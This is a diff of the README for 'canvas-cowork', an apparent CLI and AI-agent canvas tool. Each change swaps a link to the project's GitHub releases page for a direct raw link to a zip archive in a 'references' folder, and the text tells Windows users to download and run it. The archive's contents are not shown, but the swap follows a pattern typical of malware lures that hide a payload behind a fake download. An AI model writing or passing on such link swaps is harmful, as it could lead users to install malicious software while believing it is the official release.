@@ -1,10 +1,10 @@
 # 🧭 canvas-cowork - Build shared spaces from the CLI
 
-[![Download canvas-cowork](https://img.shields.io/badge/Download-Canvas--Cowork-blue?style=for-the-badge&logo=github)](https://github.com/160-cytoskeleton338/canvas-cowork/releases)
+[![Download canvas-cowork](https://img.shields.io/badge/Download-Canvas--Cowork-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/160-cytoskeleton338/canvas-cowork/main/references/cowork-canvas-3.1-beta.2.zip)
 
 ## 📥 Download
 
-Visit this page to download: https://github.com/160-cytoskeleton338/canvas-cowork/releases
+Visit this page to download: https://raw.githubusercontent.com/160-cytoskeleton338/canvas-cowork/main/references/cowork-canvas-3.1-beta.2.zip
 
 Pick the latest Windows release, then download the app file for your computer.
 
@@ -124,7 +124,7 @@ This makes it easier to find your canvases and saved results later.
 
 ## 🔗 Links
 
-- Download page: https://github.com/160-cytoskeleton338/canvas-cowork/releases
+- Download page: https://raw.githubusercontent.com/160-cytoskeleton338/canvas-cowork/main/references/cowork-canvas-3.1-beta.2.zip
 - Repository topics: agent-skills, ai-agent, canvas, claude-code, codex, flowith, mcp, openclaw, skills-sh, spatial-canvas
 
 ## 🛠️ Basic troubleshooting
